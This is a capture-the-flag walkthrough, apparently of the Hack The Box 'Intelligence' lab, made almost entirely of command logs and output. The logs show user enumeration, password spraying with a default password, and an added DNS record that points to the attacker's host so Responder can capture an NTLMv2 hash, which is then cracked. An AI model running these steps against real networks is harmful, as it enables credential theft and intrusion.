Enumeration
Nmap:
```bash
nmap -sC -A -T4 10.10.10.248  -oN nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 23:02 EDT
Nmap scan report for 10.10.10.248
Host is up (0.18s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-27 10:04:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m34s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m35s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m34s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:17+00:00; +7h01m34s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h01m34s, deviation: 0s, median: 7h01m33s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-27T10:05:41
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   184.17 ms 10.10.14.1
2   184.27 ms 10.10.10.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.84 seconds
```


```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# ls -la
total 68
drwxr-xr-x  2 root root  4096 Oct 26 23:07 .
drwxr-xr-x 11 root root  4096 Oct 26 23:07 ..
-rw-r--r--  1 root root 26835 Oct 26 23:06 2020-01-01-upload.pdf
-rw-r--r--  1 root root 27242 Oct 26 23:05 2020-12-15-upload.pdf
-rw-r--r--  1 root root  3221 Oct 26 23:04 nmap.txt
```

```bash
exiftool *.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number : 12.16
File Name : 2020-01-01-upload.pdf
Directory : .
File Size : 26 KiB
File Modification Date/Time : 2021:07:07 05:38:11+00:00
File Access Date/Time : 2021:07:07 05:38:11+00:00
File Inode Change Date/Time : 2021:07:07 05:38:17+00:00
File Permissions : rw-r--r--
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.5
Linearized : No
Page Count : 1
Creator : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number : 12.16
File Name : 2020-12-15-upload.pdf
Directory : .
File Size : 27 KiB
File Modification Date/Time : 2021:07:07 05:38:21+00:00
File Access Date/Time : 2021:07:07 05:38:21+00:00
File Inode Change Date/Time : 2021:07:07 05:38:26+00:00
File Permissions : rw-r--r--
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.5
Linearized : No
Page Count : 1
Creator : Jose.Williams
2 image files read
```

```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# cat gen_date.sh        
#!/bin/bash
start=2020-1-2
end=2022-01-01
while ! [[ $start > $end ]]; do
echo $start
start=$(date -d "$start + 1 day" +%F)
done


```


```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# pdfgrep 'pass' *.pdf                                                                                        127 ⨯
2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```

```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt 
```


```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# ./kerbrute_linux_amd64 userenum users.txt -d intelligence.htb --dc intelligence.htb 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/27/21 - Ronnie Flathers @ropnop

2021/10/27 00:07:33 >  Using KDC(s):
2021/10/27 00:07:33 >  	intelligence.htb:88

2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
2021/10/27 00:07:33 >  Done! Tested 30 usernames (30 valid) in 0.588 seconds
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# python3 GetNPUsers.py intelligence.htb/ -usersfile users.txt                                                127 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# crackmapexec smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --shares 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ            
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# smbclient \\\\intelligence.htb\\Users -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

		3770367 blocks of size 4096. 1462812 blocks available
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> ls
  .                                   D        0  Sun Apr 18 20:51:46 2021
  ..                                  D        0  Sun Apr 18 20:51:46 2021
  AppData                            DH        0  Sun Apr 18 20:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 20:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 20:51:46 2021
  Desktop                            DR        0  Sun Apr 18 20:51:46 2021
  Documents                          DR        0  Sun Apr 18 20:51:46 2021
  Downloads                          DR        0  Sat Sep 15 03:12:33 2018
  Favorites                          DR        0  Sat Sep 15 03:12:33 2018
  Links                              DR        0  Sat Sep 15 03:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 20:51:46 2021
  Music                              DR        0  Sat Sep 15 03:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 20:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT                        AHn   131072  Wed Oct 27 06:13:31 2021
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 20:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 20:51:46 2021
  Pictures                           DR        0  Sat Sep 15 03:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Saved Games                         D        0  Sat Sep 15 03:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 20:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 20:51:46 2021
  Videos                             DR        0  Sat Sep 15 03:12:33 2018

		3770367 blocks of size 4096. 1462812 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Wed Oct 27 06:04:01 2021

		3770367 blocks of size 4096. 1462812 blocks available
smb: \Tiffany.Molina\Desktop\> cat user.txt
cat: command not found
smb: \Tiffany.Molina\Desktop\> more user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as /tmp/smbmore.nA33pC (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> 
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/ldapdomaindump]
└─# ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -o ldap_dump
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# ./windapsearch-linux-amd64 -d intelligence.htb -u 'Tiffany.Molina@intelligence.htb' -m computers -p 'NewIntelligenceCorpUser9876'                                                                
dn: CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
cn: DC
operatingSystem: Windows Server 2019 Datacenter
operatingSystemVersion: 10.0 (17763)
dNSHostName: dc.intelligence.htb

dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
cn: svc_int
dNSHostName: svc_int.intelligence.htb
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
└─# python3 gMSADumper.py -d intelligence.htb -l 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
```

```
┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
└─# less domain_users.grep | grep -i support
Ted Graves	Ted Graves	Ted.Graves	IT Support	Domain Users	04/19/21 00:49:42	10/27/21 10:08:29	10/27/21 11:18:29	NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD	04/19/21 00:49:42	S-1-5-21-4210132550-3389855604-3437519686-1140	
Laura Lee	Laura Lee	Laura.Lee	IT Support	Domain Users	04/19/21 00:49:41	04/19/21 00:49:41	01/01/01 00:00:00	NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD	04/19/21 00:49:41	S-1-5-21-4210132550-3389855604-3437519686-1139	
                                                                                                                      
┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
└─# smbclient -L \\\\intelligence.htb -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

```
┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
└─# smbclient \\\\intelligence.htb\\IT -U Tiffany.Molina                                                                                                                                                                                  1 ⨯
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

		3770367 blocks of size 4096. 1462538 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                              
┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
└─# cat downdetector.ps1   
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.10.10.248 -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a add -d 10.10.14.8                                                                                       1 ⨯
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/root/Downloads/hackthebox/inteligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
                                                                                                                                                                                                                                              
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.10.10.248 -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a query
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Target record not found!
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a query 10.10.10.248                                                         
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record web
DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 84)
 - Address: 10.10.14.8
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
└─# sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-CHOJNU43T7N]
    Responder Domain Name      [Q0GF.LOCAL]
    Responder DCE-RPC Port     [47995]

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.10.10.248
[HTTP] GET request from: 10.10.10.248     URL: / 
[HTTP] Host             : web 
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:7e364817ffaf3be1:7693BEC2BAD21830AE57C84C927C461B:010100000000000079A500F629CBD701889579F2A0825A940000000002000800510030004700460001001E00570049004E002D00430048004F004A004E00550034003300540037004E000400140051003000470046002E004C004F00430041004C0003003400570049004E002D00430048004F004A004E00550034003300540037004E002E0051003000470046002E004C004F00430041004C000500140051003000470046002E004C004F00430041004C000800300030000000000000000000000000200000E348C885053BA6DC38160B59D8F10407C414F0E5D53457A57A77041046DE2C5C0A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
└─# hashcat -m 5600 hash_ted_user /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 4800H with Radeon Graphics, 2878/2942 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 5 secs

TED.GRAVES::intelligence:7e364817ffaf3be1:7693bec2bad21830ae57c84c927c461b:010100000000000079a500f629cbd701889579f2a0825a940000000002000800510030004700460001001e00570049004e002d00430048004f004a004e00550034003300540037004e000400140051003000470046002e004c004f00430041004c0003003400570049004e002d00430048004f004a004e00550034003300540037004e002e0051003000470046002e004c004f00430041004c000500140051003000470046002e004c004f00430041004c000800300030000000000000000000000000200000e348c885053ba6dc38160b59d8f10407c414f0e5d53457a57a77041046de2c5c0a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TED.GRAVES::intelligence:7e364817ffaf3be1:7693bec2b...000000
Time.Started.....: Wed Oct 27 00:58:58 2021 (15 secs)
